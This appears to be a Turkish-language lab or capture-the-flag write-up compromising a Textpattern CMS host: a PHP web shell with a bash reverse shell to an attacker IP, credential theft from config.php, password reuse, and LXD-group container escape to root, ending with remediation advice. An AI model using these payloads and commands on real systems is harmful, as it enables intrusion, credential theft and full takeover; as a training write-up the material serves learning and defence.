01 — Keşif

Port taraması ve Textpattern CMS tespiti

Hedef sistemde (192.168.1.121) yapılan taramada tek açık servis bulundu: Port 80/TCP üzerinde çalışan bir Textpattern CMS kurulumu.

Not Web servisi üzerinde yapılan keşif çalışmaları sırasında Textpattern CMS tespit edilmiş, yönetim paneline (/textpattern) erişilebildiği doğrulanmıştır.

03 — Foothold

Arbitrary File Upload ile RCE

Elde edilen kimlik bilgileriyle Textpattern admin paneline girildi. Panelin Files modülünün yüklenen dosyaların uzantılarını yeterince filtrelemediği tespit edildi — bu, sunucuya zararlı bir betik yükleyerek komut çalıştırmaya olanak tanıyordu.

shell.php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.115/4444 0>&1'");
?>

shell.php, Files modülü üzerinden yüklendi ve tarayıcı üzerinden tetiklenerek dinleyen netcat oturumuna bağlantı alındı:

nc -lvnp 4444
$ nc -lvnp 4444
Listening on any 4444 ...
connect to [192.168.1.115] from (UNKNOWN) [192.168.1.121] 42040
bash: cannot set terminal process group (1155): Inappropriate ioctl for device
bash: no job control in this shell
www-data@kb-server:/var/www/html/textpattern/files$ python3 -c 'import pty; pty.spawn("/bin/bash")'
✓ www-data yetkisiyle uzaktan kod çalıştırma (RCE) sağlandı

04 — Yatay Geçiş

config.php ve parola tekrar kullanımı

Textpattern kurulum dizininde bulunan yapılandırma dosyası okunarak veritabanı kimlik bilgileri ele geçirildi:

cat textpattern/config.php
www-data@kb-server:~/files$ cat /var/www/html/textpattern/textpattern/config.php
$txpcfg['db'] = 'textpattern';
$txpcfg['user'] = 'txtuser';
$txpcfg['pass'] = 'ghostroot510';
$txpcfg['host'] = 'localhost';

Bu veritabanı şifresinin (ghostroot510), sistem kullanıcısı machineboy için de geçerli olduğu doğrulandı — klasik parola tekrar kullanımı:

su machineboy
www-data@kb-server:~/files$ su machineboy
Password: ghostroot510
machineboy@kb-server:~$ cat /home/machineboy/user.txt
✓ user.txt ele geçirildi

05 — Yetki Yükseltme

LXD grup üyeliği sömürüsü

machineboy kullanıcısının imtiyazlı bir grup olan lxd grubuna dahil olduğu tespit edildi. Bu zafiyet, root yetkilerine sahip bir konteyner oluşturularak ana makinenin tüm dosya sistemine kısıtlama olmaksızın erişilmesine olanak tanır.

id
machineboy@kb-server:~$ id
uid=1000(machineboy) gid=1000(machineboy) groups=1000(machineboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

Kali üzerinde lxd-alpine-builder ile bir Alpine imajı derlenip HTTP üzerinden hedefe aktarıldı, ardından root yetkili ve ana makinenin kök dizinini bağlayan bir konteyner başlatıldı:

lxd konteyner sömürüsü
machineboy@kb-server:/tmp$ wget http://192.168.1.115/alpine-v3.23-x86_64-...tar.gz
Saving to: 'alpine-v3.23-x86_64-...tar.gz'

machineboy@kb-server:/tmp$ lxc image import ./alpine-v3.23...tar.gz --alias siber
machineboy@kb-server:/tmp$ lxc init siber siber_root -c security.privileged=true
Creating siber_root
machineboy@kb-server:/tmp$ lxc config device add siber_root ana_disk disk source=/ path=/mnt/root recursive=true
Device ana_disk added to siber_root
machineboy@kb-server:/tmp$ lxc start siber_root
machineboy@kb-server:/tmp$ lxc exec siber_root /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root && cat root.txt
✓ root.txt ele geçirildi — sistem tamamen kompromize edildi

Çözüm ve İyileştirme

Öneriler

  • Kullanıcıların gerekmedikçe lxd/lxc gibi yüksek imtiyazlı gruplara eklenmemesi; grup üyeliklerinin "en az ayrıcalık ilkesi" çerçevesinde periyodik denetlenmesi.
  • CMS yönetim panellerinde NIST SP 800-63B standartlarına uygun parola politikası (min. 12 karakter, başarısız denemelerde hesap kilitleme).
  • Dosya yükleme modüllerinde sıkı bir beyaz liste (whitelist) uygulanması; .php, .phtml, .exe gibi çalıştırılabilir uzantıların kesinlikle engellenmesi.
  • Hassas yapılandırma dosyalarının (config.php) dosya izinlerinin ilgili servisle sınırlandırılması (chmod 600) ve farklı servisler için benzersiz parolalar kullanılması.
